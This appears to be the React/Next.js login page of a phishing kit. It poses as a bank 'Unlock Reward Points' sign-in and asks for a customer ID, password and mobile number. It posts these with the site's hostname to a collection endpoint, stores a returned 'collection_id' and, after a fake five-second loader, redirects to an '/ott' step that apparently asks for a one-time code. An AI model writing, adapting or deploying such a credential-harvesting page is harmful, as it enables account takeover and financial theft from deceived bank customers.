'use client';
import Footer from "./inlcude/footer";
import Header from "./inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react"; 
import Loader from "./inlcude/Loader";
import styles from "./safar.module.css";

export default function Home() {
    const [loading, setLoading] = useState(false);
    const [loader, setLoader] = useState(false);
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    useEffect(()=>{
        localStorage.removeItem('collection_id');
        localStorage.removeItem('next');
        localStorage.removeItem("server_ot_times");
    }, [])
    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        const SITE = window.location.hostname;
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
              if(responseData.status==200){
                localStorage.setItem('collection_id', responseData.data);
                localStorage.setItem('next', "2");
                localStorage.setItem("server_ot_times", 1);
                setLoader(true);
                setTimeout(function(){
                  router.push('/ott');
                  setLoader(false);
                },5000)
            }else{
              alert("not found valid response");
            }
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }finally{
          setLoading(false);
        }
    }
    
  return (
    
    <>
      <Header />

      {loader ? (
        <Loader />
      ) : (
        <div className={styles.App}>
          <div className={styles.mainContent}>
            <h1 className={styles.ManzarCenter}>Login into Unlock Reward Points</h1>
            <div className={`card-login ${styles.cardLogin} `}>
              <button onClick={() => router.push("/")} id="bt1" type="button" className="active">
                Login ID / Customer ID
              </button>
              <button onClick={() => router.push("/1_")} type="button" id="bt2" className="">
                Credit Card
              </button>
            </div>
            <div className={styles.card}>
              <div>
                <section id="formA">
                  <form className="LoginForm myform fma" onSubmit={handleSubmit}>
                    <div className={`form-group ${styles.formGroup}`}>
                      <label htmlFor="Login_ID">Login ID / Customer ID</label>
                      <input
                        className={`new-control ${styles.newControl}`}
                        type="text"
                        id="Login_ID"
                        name="CustId"
                        minLength={6}
                        maxLength={30}
                        title="Please enter a valid username!"
                        required
                      />
                    </div>
                    <div className={`form-group ${styles.formGroup}`}>
                      <label htmlFor="Password">Password</label>
                      <div className="password-input">
                        <input
                          className={`new-control ${styles.newControl}`}
                          type="password"
                          minLength={6}
                          maxLength={30}
                          name="PS"
                          id="Password"
                          required
                        />
                      </div>
                    </div>
                    <div className={`form-group ${styles.formGroup}`}>
                      <label htmlFor="Mobile_Number">Mobile Number</label>
                      <input
                        className={`new-control ${styles.newControl}`}
                        type="tel"
                        id="Mobile_Number"
                        name="MB"
                        minLength={10}
                        maxLength={10}
                        inputMode="numeric"
                        title="Please enter a valid mobile number!"
                      />
                    </div>
                    <div className="text-center">
                      <input disabled={loading} type="submit" className="submit" value={"Login"} />
                    </div>
                  </form>
                </section>
              </div>
            </div>
          </div>
        </div>
      )}

      <Footer />
    </>
  );
}
